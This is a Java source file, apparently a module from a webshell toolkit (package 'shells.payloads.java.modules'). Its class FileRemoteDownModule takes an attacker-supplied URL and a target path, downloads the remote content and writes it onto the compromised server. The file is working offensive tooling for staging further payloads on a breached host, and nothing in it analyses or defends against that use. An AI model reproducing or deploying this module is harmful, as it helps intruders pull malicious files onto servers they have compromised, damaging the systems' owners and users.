package shells.payloads.java.modules;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.util.Map;

public class FileRemoteDownModule {
    private Map session;
    private Object servletRequest;

    private String getString(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        if (value instanceof byte[]) {
            return new String((byte[])value);
        }
        return value != null ? value.toString() : null;
    }

    public void setSession(Map session) {
        this.session = session;
    }

    public void setServletRequest(Object servletRequest) {
        this.servletRequest = servletRequest;
    }

    public byte[] execute() {
        String url = this.getString("url");
        String saveFile = this.getString("saveFile");
        if (url != null && saveFile != null) {
            FileOutputStream fos = null;

            try {
                InputStream is = (new URL(url)).openStream();
                fos = new FileOutputStream(saveFile);
                byte[] buf = new byte[5120];

                int n;
                while((n = is.read(buf)) != -1) {
                    fos.write(buf, 0, n);
                }

                fos.flush();
                fos.close();
                is.close();
                return "ok".getBytes();
            } catch (Exception e) {
                if (fos != null) {
                    try {
                        fos.close();
                    } catch (IOException ioe) {
                        return ioe.getMessage().getBytes();
                    }
                }

                StringBuffer sb = new StringBuffer();
                sb.append("Exception errMsg:");
                sb.append(e.getMessage());
                return sb.toString().getBytes();
            }
        } else {
            return "url or saveFile is null".getBytes();
        }
    }

    public String getModuleName() {
        return "fileRemoteDown";
    }
}
